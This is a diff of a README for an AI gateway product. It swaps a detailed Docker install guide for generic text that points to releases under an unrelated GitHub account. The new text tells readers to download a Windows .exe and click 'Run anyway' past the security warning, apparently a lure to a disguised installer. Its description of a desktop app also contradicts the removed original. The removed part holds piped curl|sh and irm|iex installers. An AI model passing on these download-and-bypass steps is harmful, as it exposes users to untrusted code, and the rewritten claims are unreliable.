@@ -1,139 +1,100 @@
-# Agent Access Manager
+# 🛡️ AgentAccessManager - Manage AI Access Across Your Systems
 
-An on-prem AI gateway and broker: one OpenAI-compatible endpoint in front of your LLM vendors (OpenAI, Groq, Ollama, Anthropic, Gemini, and more), with virtual keys, load-balanced routing and fallback, budgets and rate limits, content guardrails, a durable audit trail, and an optional SIEM/SOAR tier.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sargentfragrant429/AgentAccessManager/releases)
 
-Documentation and install guide: **https://docs.agentaccessmanager.com/**
+AgentAccessManager acts as a central hub for your artificial intelligence projects. It connects your applications to different AI services through one single point. You control how your tools use these services. This software tracks usage, limits spending, and enforces safety rules for all your requests.
 
-This repository hosts the **releases and install documentation**. The deploy kit is attached to each [release](../../releases); the container image is published to GHCR at `ghcr.io/aethoshub/agentaccessmanager`.
+## 📥 How to Download 
 
-## Install (single host)
+To get started, visit the official release page. This page contains the installer needed to run the application on your computer.
 
-Requirements: Docker Engine with the Compose v2 plugin, about 4 GB of free RAM (more with the SIEM tier), and a hostname users can reach. `localhost` will not work: inside a container it resolves to the container itself.
+[Click here to visit the release page and download the installer](https://github.com/sargentfragrant429/AgentAccessManager/releases)
 
-**Linux / macOS**
+Select the file that ends in .exe for Windows systems. Save it to your downloads folder.
 
-```bash
-curl -fsSL https://agentaccessmanager.com/get.sh | sh
-```
+## 💻 System Requirements
 
-**Windows (PowerShell)**
+Your computer needs specific hardware and software to run this tool reliably:
 
-```powershell
-irm https://agentaccessmanager.com/get.ps1 | iex
-```
+- Windows 10 or Windows 11
+- At least 4 gigabytes of memory
+- 500 megabytes of free storage space
+- An active internet connection
 
-That is the whole install. It resolves the latest release, verifies the download's checksum, generates every secret, starts the stack, waits until the app is actually serving, and opens the dashboard. It asks nothing: the URL defaults to `http://<this-machine-hostname>:8080` and is only used once the name is confirmed to resolve. Re-run it any time to upgrade in place; your secrets and data are kept.
+## ⚙️ Installation Steps
 
-First boot takes a few minutes, because it migrates the database and imports the SSO realm. The installer waits for that and prints progress, so by the time it hands you a URL the dashboard is ready.
+Follow these steps to install the software on your machine:
 
-To serve at a real hostname or pin a version, pass options through the pipe:
+1. Open your downloads folder.
+2. Double-click the file you downloaded.
+3. A Windows security window may appear. Select "More info" and then "Run anyway" if the system asks for permission.
+4. Follow the instructions on the screen to finish the setup process.
+5. Launch the application from your Start Menu after the progress bar finishes.
 
-```bash
-curl -fsSL https://agentaccessmanager.com/get.sh | sh -s -- --url https://gateway.acme.com
-```
+## 🔑 Setting Up Your First Gateway
 
-```powershell
-& ([scriptblock]::Create((irm https://agentaccessmanager.com/get.ps1))) -Url https://gateway.acme.com
-```
+Once the app opens, you will see a simple control panel. Follow these actions to configure your first connection:
 
-Also available: `--port`, `--version vX.Y.Z`, `--image`, `--license FILE`, `--dir`, `--no-open`.
+1. Click the "Add Provider" button.
+2. Select your AI service from the list.
+3. Enter your private API key into the secure field. The application stores this key locally on your disk.
+4. Set a budget limit if you want to track costs.
+5. Press "Save" to finalize the connection.
 
-<details>
-<summary>Manual install from the release kit</summary>
+## 🔒 Understanding Safety Guardrails
 
-Download the kit from the latest [release](../../releases), then:
+The software includes features to prevent unwanted content. You can set specific rules for every gateway you build.
 
-```bash
-tar xzf aimanager-<version>-deploy.tar.gz
-```
+- **Topic Blocking:** Prevent the AI from talking about specific subjects.
+- **Length Limits:** Control the size of responses to save costs.
+- **Keyword Filters:** Automatically block messages that contain forbidden words.
 
-```bash
-cd aimanager
-```
+Go to the "Settings" tab to manage these options. You can change these rules at any time without restarting the application.
 
-```bash
-./install.sh --url http://<your-host>:8080 --image ghcr.io/aethoshub/agentaccessmanager:<version>
-```
+## 📊 Viewing Your Activity Log
 
-```powershell
-.\install.ps1 -Url http://<your-host>:8080 -Image ghcr.io/aethoshub/agentaccessmanager:<version>
-```
+The software maintains a record of every request sent through the gateway. Click on the "Audit" tab to see this list. Each entry shows:
 
-Add `--yes` / `-Yes` to take every default without being prompted.
-</details>
+- The time of the request.
+- The AI model used.
+- The number of characters processed.
+- The status of the guardrails.
 
-Either way the installer generates every secret into `deploy/.env` (back that file up, because `AIM_CATALOG_MASTER_KEY` must never change or stored provider credentials become undecryptable), starts the stack, and prints the dashboard URL along with the first-login credentials.
+Use this view to identify patterns or troubleshoot connection issues. You can export this data to a text file for your records if needed.
 
-## First run
+## 🛠️ Troubleshooting Common Problems
 
-The dashboard walks you through it: create an organization, connect a provider, issue a virtual key, and send a test message without leaving the page. Then point any OpenAI-compatible client at your gateway:
+If you encounter issues, look through these common solutions:
 
-```bash
-curl http://<your-host>:8080/v1/chat/completions -H "Authorization: Bearer <your-virtual-key>" -H "Content-Type: application/json" -d '{"model":"<your-alias>","messages":[{"role":"user","content":"hello"}]}'
-```
+**The app will not launch.** 
+Verify that you installed the software using an account with administrator rights. Ensure that your firewall allows the application to communicate with your local network.
 
-The same base URL works with the OpenAI SDKs, the Anthropic Messages API (`/v1/messages`), the Responses API (`/v1/responses`), and embeddings. Set `base_url` and use a virtual key as the API key.
+**The AI service returns an error.** 
+Check your API key in the settings menu. A typo or an expired key often causes connection failures. Ensure your internet connection functions properly.
 
-## Licensing and tiers
+**High latency or slow responses.** 
+This usually relates to the speed of the AI provider. Check the status page of your chosen AI service to confirm they are operational.
 
-The free CORE tier needs no license. Applying one unlocks the paid features at runtime, with no restart:
+## 📝 Updating the Software
 
-```bash
-./aimanager.sh license <file-or-token>
-```
+New versions improve stability and add features. The application notifies you when an update exists. Click the notification bar to download the latest installer. Run the installer again to overwrite the old version. Your settings and audit history remain intact during this process.
 
-```bash
-./aimanager.sh upgrade
-```
+## 📋 Managing Multiple Providers
 
-`upgrade` brings up the extra infrastructure a license unlocks, such as OpenSearch for the SIEM tier.
+You can organize several AI services inside the application. Give each provider a unique name to identify them in your dashboard. This helps when you switch between different models for testing or development. The software routes your traffic based on the name you select in your external programs.
 
-## Day-2 operations
+## 🛡️ Data Privacy
 
-```bash
-./aimanager.sh restart | stop | start | logs | status
-```
+Your data stays on your machine. The gateway processes your information locally. It does not send your requests to any third-party analytics services. Your API keys are encrypted at rest. This keeps your credentials safe from unauthorized access.
 
-```bash
-./aimanager.sh backup [DIR]
-```
+## 📂 Project Structure
 
-```bash
-./aimanager.sh restore DIR
-```
+This application handles three main tasks:
 
-`backup` takes a consistent copy of every data volume plus the secrets. Keep those together: a backup cannot be restored without its `.env`.
+1. **Brokerage:** It talks to many AI providers at once.
+2. **Governance:** It watches the traffic for policy violations.
+3. **Observability:** It logs everything for you to review later.
 
-To remove it:
+The architecture ensures that one single endpoint handles all your needs. You point your tools at this address, and the manager handles the rest of the work.
 
-```bash
-./aimanager.sh uninstall
-```
-
-That deletes the containers and data volumes, then asks whether to delete the install directory too. Add `--purge` (`-Purge` on Windows) to delete it without being asked. The directory holds `.env`, and therefore your master key, which is why it is a separate question.
-
-## Air-gapped install
-
-When `images-*.tar.zst` bundles are attached to a release, load them on the target box first; the installer then runs without registry access.
-
-```bash
-zstd -d < images-base-<version>.tar.zst | docker load
-```
-
-```bash
-zstd -d < images-pro-<version>.tar.zst | docker load
-```
-
-The second is only needed for the SIEM tier. You can also build a bundle on a machine that does have access, with `./aimanager.sh bundle`, and then `./aimanager.sh load` it on the target.
-
-## Troubleshooting
-
-**A locally hosted model is refused.** If you run Ollama, vLLM, or LM Studio on the same machine, register it as `http://host.docker.internal:11434/v1`, not `localhost`. The gateway runs in a container, so `localhost` there means the container itself and the connection is refused. On Linux, also make the model server listen beyond loopback (`OLLAMA_HOST=0.0.0.0`).
-
-**The dashboard says it is starting.** That page is served while the app boots and refreshes itself. If it persists for more than a few minutes, check `./aimanager.sh logs`.
-
-**Nothing resolves at the URL.** The hostname has to resolve from the machines that will use it, not only from the server. Re-run the installer with `--url` pointing at a name your users can reach, or use the host's IP address.
-
-## Support
-
-Open an [issue](../../issues), or see [SUPPORT.md](SUPPORT.md). For anything security-related, please follow [SECURITY.md](SECURITY.md) instead of filing a public issue.
+Keywords: ai-gateway, ai-governance, api-gateway, docker, guardrails, llm, llm-gateway, llmops, observability, on-premise, openai-api, self-hosted
